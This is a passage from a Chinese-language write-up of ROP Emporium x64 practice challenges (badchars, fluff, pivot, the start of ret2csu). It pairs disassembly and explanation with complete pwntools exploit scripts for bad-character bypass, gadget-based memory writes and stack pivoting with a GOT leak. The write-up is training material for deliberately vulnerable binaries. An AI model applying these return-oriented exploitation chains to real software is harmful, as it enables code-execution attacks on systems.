.text:000000000040062B                 retn
.text:000000000040062C ; ---------------------------------------------------------------------------
.text:000000000040062C                 add     [r15], r14b
.text:000000000040062F                 retn
.text:0000000000400630 ; ---------------------------------------------------------------------------
.text:0000000000400630                 sub     [r15], r14b
.text:0000000000400633                 retn
.text:0000000000400634
.text:0000000000400634 ; =============== S U B R O U T I N E =======================================
.text:0000000000400634
.text:0000000000400634
.text:0000000000400634 sub_400634      proc near
.text:0000000000400634                 mov     [r13+0], r12
.text:0000000000400638                 retn
.text:0000000000400638 sub_400634      endp
```

目标是读取 flag.txt，这里的意思应该是，通过输入其他的数值，然后通过计算来绕过过滤，出现过滤字符会变成 EB

有提供 print_file 的链接，可以调用这个函数，目标就是 rop 到目标函数！

```
int __fastcall print_file(const char *a1)
{
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  FILE *stream; // [rsp+38h] [rbp-8h]
 
  stream = fopen(a1, "r");
  if ( !stream )
  {
    printf("Failed to open file: %s\n", a1);
    exit(1);
  }
  fgets(s, 33, stream);
  puts(s);
  return fclose(stream);
}
```

这里参数提供文件名，需要我们自己构造参数

思路是，无脑给 flag.txt 字符串进行异或，绕过限制，然后调整 r14 和 r15 指针，去逐个异或解密，然后跳转到 print_file

要是觉得太长了，可以优化一下，部分位不进行加密，只解密过滤的位，这里图省事全处理了

exp：

```
#!/bin/python3
from Crypto.Util.number import *
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "badchars"
REMOTE_HOST = ""
REMOTE_PORT = 0
 
 
elf = context.binary = ELF(FILE_NAME)
libc = elf.libc
 
gs = '''
continue
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
 
# =======================================
 
io = start()
 
# =============================================================================
# ============== exploit ===================
 
"""
.text:0000000000400628 usefulGadgets:
.text:0000000000400628                 xor     [r15], r14b
.text:000000000040062B                 retn
.text:000000000040062C ; ---------------------------------------------------------------------------
.text:000000000040062C                 add     [r15], r14b
.text:000000000040062F                 retn
.text:0000000000400630 ; ---------------------------------------------------------------------------
.text:0000000000400630                 sub     [r15], r14b
.text:0000000000400633                 retn
.text:0000000000400634
.text:0000000000400634 ; =============== S U B R O U T I N E =======================================
.text:0000000000400634
.text:0000000000400634
.text:0000000000400634 sub_400634      proc near
.text:0000000000400634                 mov     [r13+0], r12
.text:0000000000400638                 retn
.text:0000000000400638 sub_400634      endp
"""
 
# filter the x g a .
buf = 0x601100
i = 0
rop = ROP(elf,badchars=b'xga.')
rop.rbp = buf-0x100
rop.raw(0x40069c)
rop.raw(bytes_to_long("".join(reversed("flag.txt")).encode()) ^ 0x1111111111111111)
rop.raw(buf)
rop.raw(0x11)
rop.raw(buf+i)
rop.raw(0x000000000400634)
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
rop.raw(0x000000000400628)
i+=1
while i<8:
    rop.raw(0x00000000004006a2)    # 0x00000000004006a2 : pop r15 ; ret
    rop.raw(buf+i)
    rop.raw(0x000000000400628)    # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
    i+=1
 
rop.rdi = buf
rop.raw(elf.plt.print_file)
 
print(rop.dump())
payload = cyclic(0x28) + rop.chain()
io.sendlineafter(b"> ",payload)
 
 
io.interactive()
```

运行结果：

```
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

6. fluff
--------

缓解机制：【NX】

程序：（位于 so 文件）

```
.text:00000000000008AA pwnme           proc near               ; DATA XREF: LOAD:00000000000003E0↑o
.text:00000000000008AA
.text:00000000000008AA s               = byte ptr -20h
.text:00000000000008AA
.text:00000000000008AA ; __unwind {
.text:00000000000008AA                 push    rbp
.text:00000000000008AB                 mov     rbp, rsp
.text:00000000000008AE                 sub     rsp, 20h
.text:00000000000008B2                 mov     rax, cs:stdout_ptr
.text:00000000000008B9                 mov     rax, [rax]
.text:00000000000008BC                 mov     ecx, 0          ; n
.text:00000000000008C1                 mov     edx, 2          ; modes
.text:00000000000008C6                 mov     esi, 0          ; buf
.text:00000000000008CB                 mov     rdi, rax        ; stream
.text:00000000000008CE                 call    _setvbuf
.text:00000000000008D3                 lea     rdi, s          ; "fluff by ROP Emporium"
.text:00000000000008DA                 call    _puts
.text:00000000000008DF                 lea     rdi, aX8664     ; "x86_64\n"
.text:00000000000008E6                 call    _puts
.text:00000000000008EB                 lea     rax, [rbp+s]
.text:00000000000008EF                 mov     edx, 20h ; ' '  ; n
.text:00000000000008F4                 mov     esi, 0          ; c
.text:00000000000008F9                 mov     rdi, rax        ; s
.text:00000000000008FC                 call    _memset
.text:0000000000000901                 lea     rdi, aYouKnowChangin ; "You know changing these strings means I"...
.text:0000000000000908                 call    _puts
.text:000000000000090D                 lea     rdi, format     ; "> "
.text:0000000000000914                 mov     eax, 0
.text:0000000000000919                 call    _printf

.text:000000000000091E                 lea     rax, [rbp+s]
.text:0000000000000922                 mov     edx, 200h       ; nbytes
.text:0000000000000927                 mov     rsi, rax        ; buf
.text:000000000000092A                 mov     edi, 0          ; fd
.text:000000000000092F                 call    _read

.text:0000000000000934                 lea     rdi, aThankYou  ; "Thank you!"
.text:000000000000093B                 call    _puts
.text:0000000000000940                 nop
.text:0000000000000941                 leave
.text:0000000000000942                 retn
.text:0000000000000942 ; } // starts at 8AA
.text:0000000000000942 pwnme           endp
```

read 调用存在溢出

程序提供了一些辅助代码：

```
.text:0000000000400617 usefulFunction  proc near
.text:0000000000400617 ; __unwind {
.text:0000000000400617                 push    rbp
.text:0000000000400618                 mov     rbp, rsp
.text:000000000040061B                 mov     edi, offset aNonexistent ; "nonexistent"
.text:0000000000400620                 call    _print_file
.text:0000000000400625                 nop
.text:0000000000400626                 pop     rbp
.text:0000000000400627                 retn
.text:0000000000400627 ; } // starts at 400617
.text:0000000000400627 usefulFunction  endp
.text:0000000000400627
.text:0000000000400628 ; ---------------------------------------------------------------------------
.text:0000000000400628
.text:0000000000400628 questionableGadgets:
.text:0000000000400628                 xlat
.text:0000000000400629                 retn
.text:000000000040062A ; ---------------------------------------------------------------------------
.text:000000000040062A                 pop     rdx
.text:000000000040062B                 pop     rcx
.text:000000000040062C                 add     rcx, 3EF2h
.text:0000000000400633                 bextr   rbx, rcx, rdx
.text:0000000000400638                 retn
.text:0000000000400639 ; ---------------------------------------------------------------------------
.text:0000000000400639                 stosb
.text:000000000040063A                 retn
.text:000000000040063A ; ---------------------------------------------------------------------------
```

目标是读取 flag.txt，这里也提供了 print_file 函数可以用，需要参数 flag.txt 字符串指针

xlat：以 al 为偏移，索引 bx 指向内存中的字节，可以用来从内存里取字节，需要 al 和 bx 的值可控

bextr：位域索引，第一个源操作数是原数据，第二个源操作数是索引开始位置（8 位）和长度，这里可以控制 rbx 的值

其他有用的 gadget：

```
0x00000000004006a3 : pop rdi ; ret
0x0000000000400639 : stosb byte ptr [rdi], al ; ret
```

stosb 可以保存 1 个字节从 al 到 rdi 指向的地址，rdi 可以控制，设置为随便一个可写地址就行

xlat 的效果是，al = [al+rbx]，rbx 是数组，从 rbx 中用 al 索引一个字节到 al 上，al 这里初始值是 0xb，需要 rbx 可控，就能控制 al 的值

bextr 可以用来控制 rbx 的值，rcx 填写目标地址 - 0x3e2f 的值，rdx 填写 0x4000，表示把 rcx 的值全部复制给 rbx

到此，rbx 可控，从而 al 可控，从而可以写入字节到任意可写内存，开始一步一步实现：

控制 rbx：

```
def set_rbx(b:int):
    p = b""
    p += pack(bextr_ret)
    p += pack(0x4000)
    p += pack(b - 0x3ef2)
    return p
```

控制 al：

```
def set_al(a:bytes,offset:int):
    tmp = next(elf.search(a)) - offset
    #print(hex(tmp))
    p = pack(xlatb_ret)
    return set_rbx(tmp) + p
```

保存 al 到地址：

```
is_first = True
def save_al(val:bytes,offset:int):
    global is_first
    p = b""
    if is_first:
        p += pack(pop_rdi_ret)
        p += pack(buffer)
        is_first = False
    p += pack(stosb_rdi_al_ret)
    return set_al(val,offset) + p
```

保存字符串到地址：

```
def write_str(s:bytes):
    p=b""
    last_al = 0xb
    for i in s:
        p += save_al(p8(i),last_al)
        last_al = i
    return p
```

完整 exp：

```
#!/bin/python3
from Crypto.Util.number import *
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "fluff"
REMOTE_HOST = ""
REMOTE_PORT = 0
 
 
elf = context.binary = ELF(FILE_NAME)
libc = elf.libc
 
gs = '''
b*pwnme+151
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
 
# =======================================
 
io = start()
 
# =============================================================================
# ============== exploit ===================
pop_rdi_ret = 0x00000000004006a3        # : pop rdi ; ret
stosb_rdi_al_ret = 0x0000000000400639   # : stosb byte ptr [rdi], al ; ret
xlatb_ret = 0x0000000000400628          # : xlat ; ret
 
"""
.text:000000000040062A                 pop     rdx
.text:000000000040062B                 pop     rcx
.text:000000000040062C                 add     rcx, 3EF2h
.text:0000000000400633                 bextr   rbx, rcx, rdx
.text:0000000000400638                 retn
"""
bextr_ret = 0x000000000040062A
 
padding = b'A' * 0x28
 
buffer = 0x000000000601038
print_file = 0x000000000400620
 
def set_rbx(b:int):
    p = b""
    p += pack(bextr_ret)
    p += pack(0x4000)
    p += pack(b - 0x3ef2)
    return p
 
def set_al(a:bytes,offset:int):
    tmp = next(elf.search(a)) - offset
    #print(hex(tmp))
    p = pack(xlatb_ret)
    return set_rbx(tmp) + p
 
is_first = True
def save_al(val:bytes,offset:int):
    global is_first
    p = b""
    if is_first:
        p += pack(pop_rdi_ret)
        p += pack(buffer)
        is_first = False
    p += pack(stosb_rdi_al_ret)
    return set_al(val,offset) + p
 
def write_str(s:bytes):
    p=b""
    last_al = 0xb
    for i in s:
        p += save_al(p8(i),last_al)
        last_al = i
    return p
 
 
payload = write_str(b"flag.txt")
payload += pack(pop_rdi_ret)
payload += pack(buffer)
payload += pack(print_file)
 
io.sendline(padding + payload)
 
io.interactive()
```

运行结果：

```
fluff.zip.d ➤ python3 exp.py
[*] '/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/fluff.zip.d/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/fluff.zip.d/fluff' argv=[b'/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/fluff.zip.d/fluff'] : pid 66892
[DEBUG] Sent 0x191 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  2a 06 40 00  00 00 00 00  │AAAA│AAAA│*·@·│····│
    00000030  00 40 00 00  00 00 00 00  c7 c4 3f 00  00 00 00 00  │·@··│····│··?·│····│
    00000040  28 06 40 00  00 00 00 00  a3 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000050  38 10 60 00  00 00 00 00  39 06 40 00  00 00 00 00  │8·`·│····│9·@·│····│
    00000060  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    00000070  e1 c2 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │··?·│····│(·@·│····│
    00000080  39 06 40 00  00 00 00 00  2a 06 40 00  00 00 00 00  │9·@·│····│*·@·│····│
    00000090  00 40 00 00  00 00 00 00  78 c4 3f 00  00 00 00 00  │·@··│····│x·?·│····│
    000000a0  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    000000b0  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    000000c0  7c c4 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │|·?·│····│(·@·│····│
    000000d0  39 06 40 00  00 00 00 00  2a 06 40 00  00 00 00 00  │9·@·│····│*·@·│····│
    000000e0  00 40 00 00  00 00 00 00  f5 c2 3f 00  00 00 00 00  │·@··│····│··?·│····│
    000000f0  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    00000100  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    00000110  72 c2 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │r·?·│····│(·@·│····│
    00000120  39 06 40 00  00 00 00 00  2a 06 40 00  00 00 00 00  │9·@·│····│*·@·│····│
    00000130  00 40 00 00  00 00 00 00  e0 c2 3f 00  00 00 00 00  │·@··│····│··?·│····│
    00000140  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    00000150  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    00000160  28 c2 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │(·?·│····│(·@·│····│
    00000170  39 06 40 00  00 00 00 00  a3 06 40 00  00 00 00 00  │9·@·│····│··@·│····│
    00000180  38 10 60 00  00 00 00 00  20 06 40 00  00 00 00 00  │8·`·│····│ ·@·│····│
    00000190  0a                                                  │·│
[*] Switching to interactive mode
[DEBUG] Received 0x94 bytes:
    b'fluff by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'You know changing these strings means I have to rewrite my solutions...\n'
    b'> Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

7. pivot
--------

缓解机制：【NX】

程序：

main：

```
.text:0000000000400847 ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:0000000000400847                 public main
.text:0000000000400847 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000400847
.text:0000000000400847 var_10          = qword ptr -10h
.text:0000000000400847 ptr             = qword ptr -8
.text:0000000000400847
.text:0000000000400847 ; __unwind {
.text:0000000000400847                 push    rbp
.text:0000000000400848                 mov     rbp, rsp
.text:000000000040084B                 sub     rsp, 10h
.text:000000000040084F                 mov     rax, cs:__bss_start
.text:0000000000400856                 mov     ecx, 0          ; n
.text:000000000040085B                 mov     edx, 2          ; modes
.text:0000000000400860                 mov     esi, 0          ; buf
.text:0000000000400865                 mov     rdi, rax        ; stream
.text:0000000000400868                 call    _setvbuf
.text:000000000040086D                 mov     edi, offset s   ; "pivot by ROP Emporium"
.text:0000000000400872                 call    _puts
.text:0000000000400877                 mov     edi, offset aX8664 ; "x86_64\n"
.text:000000000040087C                 call    _puts
.text:0000000000400881                 mov     [rbp+ptr], 0
.text:0000000000400889                 mov     edi, 1000000h   ; size
.text:000000000040088E                 call    _malloc
.text:0000000000400893                 mov     [rbp+ptr], rax
.text:0000000000400897                 cmp     [rbp+ptr], 0
.text:000000000040089C                 jnz     short loc_4008B2
.text:000000000040089E                 mov     edi, offset aFailedToReques ; "Failed to request space for pivot stack"
.text:00000000004008A3                 call    _puts
.text:00000000004008A8                 mov     edi, 1          ; status
.text:00000000004008AD                 call    _exit
.text:00000000004008B2 ; ---------------------------------------------------------------------------
.text:00000000004008B2
.text:00000000004008B2 loc_4008B2:                             ; CODE XREF: main+55↑j
.text:00000000004008B2                 mov     rax, [rbp+ptr]
.text:00000000004008B6                 add     rax, 0FFFF00h
.text:00000000004008BC                 mov     [rbp+var_10], rax
.text:00000000004008C0                 mov     rax, [rbp+var_10]
.text:00000000004008C4                 mov     rdi, rax
.text:00000000004008C7                 call    pwnme
.text:00000000004008CC                 mov     [rbp+var_10], 0
.text:00000000004008D4                 mov     rax, [rbp+ptr]
.text:00000000004008D8                 mov     rdi, rax        ; ptr
.text:00000000004008DB                 call    _free
.text:00000000004008E0                 mov     edi, offset aExiting ; "\nExiting"
.text:00000000004008E5                 call    _puts
.text:00000000004008EA                 mov     eax, 0
.text:00000000004008EF                 leave
.text:00000000004008F0                 retn
.text:00000000004008F0 ; } // starts at 400847
.text:00000000004008F0 main            endp
```

这里申请了巨大无比的内存传入

pwnme：

```
.text:00000000004008F1 pwnme           proc near               ; CODE XREF: main+80↑p
.text:00000000004008F1
.text:00000000004008F1 buf             = qword ptr -28h
.text:00000000004008F1 s               = byte ptr -20h
.text:00000000004008F1
.text:00000000004008F1 ; __unwind {
.text:00000000004008F1                 push    rbp
.text:00000000004008F2                 mov     rbp, rsp
.text:00000000004008F5                 sub     rsp, 30h
.text:00000000004008F9                 mov     [rbp+buf], rdi
.text:00000000004008FD                 lea     rax, [rbp+s]
.text:0000000000400901                 mov     edx, 20h ; ' '  ; n
.text:0000000000400906                 mov     esi, 0          ; c
.text:000000000040090B                 mov     rdi, rax        ; s
.text:000000000040090E                 call    _memset
.text:0000000000400913                 mov     edi, offset aCallRet2winFro ; "Call ret2win() from libpivot"
.text:0000000000400918                 call    _puts
.text:000000000040091D                 mov     rax, [rbp+buf]
.text:0000000000400921                 mov     rsi, rax
.text:0000000000400924                 mov     edi, offset format ; "The Old Gods kindly bestow upon you a p"...
.text:0000000000400929                 mov     eax, 0
.text:000000000040092E                 call    _printf
.text:0000000000400933                 mov     edi, offset aSendARopChainN ; "Send a ROP chain now and it will land t"...
.text:0000000000400938                 call    _puts
.text:000000000040093D                 mov     edi, offset asc_400B34 ; "> "
.text:0000000000400942                 mov     eax, 0
.text:0000000000400947                 call    _printf
.text:000000000040094C                 mov     rax, [rbp+buf]
.text:0000000000400950                 mov     edx, 100h       ; nbytes
.text:0000000000400955                 mov     rsi, rax        ; buf
.text:0000000000400958                 mov     edi, 0          ; fd
.text:000000000040095D                 call    _read

.text:0000000000400962                 mov     edi, offset aThankYou ; "Thank you!\n"
.text:0000000000400967                 call    _puts
.text:000000000040096C                 mov     edi, offset aNowPleaseSendY ; "Now please send your stack smash"
.text:0000000000400971                 call    _puts
.text:0000000000400976                 mov     edi, offset asc_400B34 ; "> "
.text:000000000040097B                 mov     eax, 0
.text:0000000000400980                 call    _printf
.text:0000000000400985                 lea     rax, [rbp+s]
.text:0000000000400989                 mov     edx, 40h ; '@'  ; nbytes
.text:000000000040098E                 mov     rsi, rax        ; buf
.text:0000000000400991                 mov     edi, 0          ; fd
.text:0000000000400996                 call    _read

.text:000000000040099B                 mov     edi, offset aThankYou_0 ; "Thank you!"
.text:00000000004009A0                 call    _puts
.text:00000000004009A5                 nop
.text:00000000004009A6                 leave
.text:00000000004009A7                 retn
.text:00000000004009A7 ; } // starts at 4008F1
.text:00000000004009A7 pwnme           endp
```

read 调用了 2 次，第一次是读取到一个缓冲区里，第二次是读取到栈上，可溢出长度非常短

程序提供了缓冲区的地址，这是个栈迁移 pivot 的示例练习，程序执行输出信息：

```
pivot.zip.d ➤ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f2319fd5f10
Send a ROP chain now and it will land there
> 111
Thank you!

Now please send your stack smash
> 222
Thank you!

Exiting
```

程序提供了一些辅助代码：

```
.text:00000000004009A8 uselessFunction proc near
.text:00000000004009A8 ; __unwind {
.text:00000000004009A8                 push    rbp
.text:00000000004009A9                 mov     rbp, rsp
.text:00000000004009AC                 call    _foothold_function
.text:00000000004009B1                 mov     edi, 1          ; status
.text:00000000004009B6                 call    _exit
.text:00000000004009B6 ; } // starts at 4009A8
.text:00000000004009B6 uselessFunction endp
.text:00000000004009B6
.text:00000000004009BB ; ---------------------------------------------------------------------------
.text:00000000004009BB
.text:00000000004009BB usefulGadgets:
.text:00000000004009BB                 pop     rax
.text:00000000004009BC                 retn
.text:00000000004009BD ; ---------------------------------------------------------------------------
.text:00000000004009BD                 xchg    rax, rsp
.text:00000000004009BF                 retn
.text:00000000004009C0
.text:00000000004009C0 ; =============== S U B R O U T I N E =======================================
.text:00000000004009C0
.text:00000000004009C0
.text:00000000004009C0 sub_4009C0      proc near
.text:00000000004009C0                 mov     rax, [rax]
.text:00000000004009C3                 retn
.text:00000000004009C3 sub_4009C0      endp
.text:00000000004009C3
.text:00000000004009C4 ; ---------------------------------------------------------------------------
.text:00000000004009C4                 add     rax, rbp
.text:00000000004009C7                 retn
```

提供了_foothold_function 函数，在 so 库里，查看 so 该函数：

```
.text:000000000000096A foothold_function proc near             ; DATA XREF: LOAD:0000000000000388↑o
.text:000000000000096A ; __unwind {
.text:000000000000096A                 push    rbp
.text:000000000000096B                 mov     rbp, rsp
.text:000000000000096E                 lea     rdi, s          ; "foothold_function(): Check out my .got."...
.text:0000000000000975                 call    _puts
.text:000000000000097A                 nop
.text:000000000000097B                 pop     rbp
.text:000000000000097C                 retn
.text:000000000000097C ; } // starts at 96A
.text:000000000000097C foothold_function endp
```

该函数毫无意义，但是可以用于延迟绑定后提供该 so 库的地址泄露

so 库里还有个后门函数：

```
.text:0000000000000A81                 public ret2win
.text:0000000000000A81 ret2win         proc near               ; DATA XREF: LOAD:0000000000000448↑o
.text:0000000000000A81
.text:0000000000000A81 stream          = qword ptr -38h
.text:0000000000000A81 s               = byte ptr -30h
.text:0000000000000A81 var_8           = qword ptr -8
.text:0000000000000A81
.text:0000000000000A81 ; __unwind {
.text:0000000000000A81                 push    rbp
.text:0000000000000A82                 mov     rbp, rsp
.text:0000000000000A85                 sub     rsp, 40h
.text:0000000000000A89                 mov     rax, fs:28h
.text:0000000000000A92                 mov     [rbp+var_8], rax
.text:0000000000000A96                 xor     eax, eax
.text:0000000000000A98                 mov     [rbp+stream], 0
.text:0000000000000AA0                 lea     rsi, modes      ; "r"
.text:0000000000000AA7                 lea     rdi, filename   ; "flag.txt"
.text:0000000000000AAE                 call    _fopen
.text:0000000000000AB3                 mov     [rbp+stream], rax
.text:0000000000000AB7                 cmp     [rbp+stream], 0
.text:0000000000000ABC                 jnz     short loc_AD4
.text:0000000000000ABE                 lea     rdi, aFailedToOpenFi ; "Failed to open file: flag.txt"
.text:0000000000000AC5                 call    _puts
.text:0000000000000ACA                 mov     edi, 1          ; status
.text:0000000000000ACF                 call    _exit
.text:0000000000000AD4 ; ---------------------------------------------------------------------------
.text:0000000000000AD4
.text:0000000000000AD4 loc_AD4:                                ; CODE XREF: ret2win+3B↑j
.text:0000000000000AD4                 mov     rdx, [rbp+stream] ; stream
.text:0000000000000AD8                 lea     rax, [rbp+s]
.text:0000000000000ADC                 mov     esi, 21h ; '!'  ; n
.text:0000000000000AE1                 mov     rdi, rax        ; s
.text:0000000000000AE4                 call    _fgets
.text:0000000000000AE9                 lea     rax, [rbp+s]
.text:0000000000000AED                 mov     rdi, rax        ; s
.text:0000000000000AF0                 call    _puts
.text:0000000000000AF5                 mov     rax, [rbp+stream]
.text:0000000000000AF9                 mov     rdi, rax        ; stream
.text:0000000000000AFC                 call    _fclose
.text:0000000000000B01                 mov     [rbp+stream], 0
.text:0000000000000B09                 mov     edi, 0          ; status
.text:0000000000000B0E                 call    _exit
.text:0000000000000B0E ; } // starts at A81
.text:0000000000000B0E ret2win         endp
.text:0000000000000B0E
.text:0000000000000B0E _text           ends
```

思路现在就是：

1.  执行_foothold_function 函数，
    
2.  打印_foothold_function 的 got 表，泄露地址，拿到 win 函数地址
    
3.  返回到 pwnme 函数的末尾 read 函数调用
    
    1.  这里要注意 rbp 的值，以及 leave 之后的 rsp，适当的调整以至于能覆盖到返回地址
4.  调用 win 函数
    

在此之前，需要进行栈迁移：

1.  读取提供的可控缓冲区地址
2.  使用该地址覆盖 rbp
3.  返回地址跳转到 leave ret 指令，完成迁移

exp：

```
#!/bin/python3
from Crypto.Util.number import *
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "./pivot"
REMOTE_HOST = ""
REMOTE_PORT = 0


elf = context.binary = ELF(FILE_NAME)
libc = elf.libc

gs = '''
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# =======================================

io = start()

# =============================================================================
# ============== exploit ===================

io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
buffer = io.recvline()[:-1]
buffer = int(buffer.decode(),16)
buffer = buffer 
print(hex(buffer))

_foothold_function_plt = 0x00000000400720
_foothold_function_got = 0x00000000601040
main = 0x000000000400985
rop = ROP(elf)
rop.raw(_foothold_function_plt)
rop.puts(_foothold_function_got)
rop.rbp=buffer + 0x60
rop.raw(main)
io.sendafter(b"> ",b"A" *   0x8 + rop.chain())




padding = b"A" * 0x20
payload2 = padding + pack(buffer) + pack(next(elf.search(asm("leave;ret"))))
print(payload2)
io.sendafter(b"> ",payload2)


io.recvuntil(b"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")
leak = io.recvline()[:-1]
leak = u64(leak.ljust(8, b"\x00"))
print(hex(leak))

baseso = leak - 0x96a
win = baseso + 0xa81
payload3 = b"A"*0x28+ pack(win)
io.send(payload3)

io.interactive()
```

运行结果：

```
pivot.zip.d ➤ ./exp_cli.py debug pivot
[*] '/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/pivot.zip.d/pivot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/pivot.zip.d/pivot': pid 123437
0x7fc5097d5f10
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10_}\t\xc5\x7f\x00\x00\xef\x08@\x00\x00\x00\x00\x00'
0x7fc509a0096a
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

8. ret2csu
----------

缓解机制：【NX】

程序：pwnme 在 so 库里

```
.text:000000000000093A                 public pwnme
.text:000000000000093A pwnme           proc near               ; DATA XREF: LOAD:00000000000003F8↑o
.text:000000000000093A
.text:000000000000093A s               = byte ptr -20h
.text:000000000000093A
.text:000000000000093A ; __unwind {
.text:000000000000093A                 push    rbp
.text:000000000000093B                 mov     rbp, rsp
.text:000000000000093E                 sub     rsp, 20h
.text:0000000000000942                 mov     rax, cs:stdout_ptr
.text:0000000000000949                 mov     rax, [rax]
.text:000000000000094C                 mov     ecx, 0          ; n
.text:0000000000000951                 mov     edx, 2          ; modes
.text:0000000000000956                 mov     esi, 0          ; buf
.text:000000000000095B                 mov     rdi, rax        ; stream
.text:000000000000095E                 call    _setvbuf
.text:0000000000000963                 lea     rdi, s          ; "ret2csu by ROP Emporium"
.text:000000000000096A                 call    _puts
.text:000000000000096F                 lea     rdi, aX8664     ; "x86_64\n"
.text:0000000000000976                 call    _puts
.text:000000000000097B                 lea     rax, [rbp+s]
.text:000000000000097F                 mov     edx, 20h ; ' '  ; n
.text:0000000000000984                 mov     esi, 0          ; c
.text:0000000000000989                 mov     rdi, rax        ; s
.text:000000000000098C                 call    _memset
.text:0000000000000991                 lea     rdi, aCheckOutHttpsR ; "Check out https://ropemporium.com/chall"...
.text:0000000000000998                 call    _puts
.text:000000000000099D                 lea     rdi, format     ; "> "
.text:00000000000009A4                 mov     eax, 0
.text:00000000000009A9                 call    _printf
.text:00000000000009AE                 lea     rax, [rbp+s]
.text:00000000000009B2                 mov     edx, 200h       ; nbytes
.text:00000000000009B7                 mov     rsi, rax        ; buf
.text:00000000000009BA                 mov     edi, 0          ; fd
.text:00000000000009BF                 call    _read
.text:00000000000009C4                 lea     rdi, aThankYou  ; "Thank you!"
.text:00000000000009CB                 call    _puts
.text:00000000000009D0                 nop
.text:00000000000009D1                 leave
.text:00000000000009D2                 retn
.text:00000000000009D2 ; } // starts at 93A
.text:00000000000009D2 pwnme           endp
```

read 调用存在溢出，可以溢出很大空间

so 库还提供了后门函数：（太长了，就用伪代码吧）

```
void __fastcall __noreturn ret2win(__int64 a1, __int64 a2, __int64 a3)
{
  FILE *stream; // [rsp+20h] [rbp-10h]
  FILE *streama; // [rsp+20h] [rbp-10h]
  int i; // [rsp+2Ch] [rbp-4h]
 
  if ( a1 == 0xDEADBEEFDEADBEEFLL && a2 == 0xCAFEBABECAFEBABELL && a3 == 0xD00DF00DD00DF00DLL )
  {
    stream = fopen("encrypted_flag.dat", "r");
    if ( !stream )
    {
      puts("Failed to open encrypted_flag.dat");
      exit(1);
    }
    g_buf = (char *)malloc(0x21uLL);
    if ( !g_buf )
    {
      puts("Could not allocate memory");
      exit(1);
    }
    g_buf = fgets(g_buf, 33, stream);
    fclose(stream);
    streama = fopen("key.dat", "r");
    if ( !streama )
    {
      puts("Failed to open key.dat");
      exit(1);
    }
    for ( i = 0; i <= 31; ++i )
      g_buf[i] ^= fgetc(streama);
    *(_QWORD *)(g_buf + 4) ^= 0xDEADBEEFDEADBEEFLL;
    *(_QWORD *)(g_buf + 12) ^= 0xCAFEBABECAFEBABELL;
    *(_QWORD *)(g_buf + 20) ^= 0xD00DF00DD00DF00DLL;
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}
```

elf 里的有用片段：

```
.text:0000000000400617 usefulFunction  proc near
.text:0000000000400617 ; __unwind {
.text:0000000000400617                 push    rbp
.text:0000000000400618                 mov     rbp, rsp
.text:000000000040061B                 mov     edx, 3
.text:0000000000400620                 mov     esi, 2
.text:0000000000400625                 mov     edi, 1
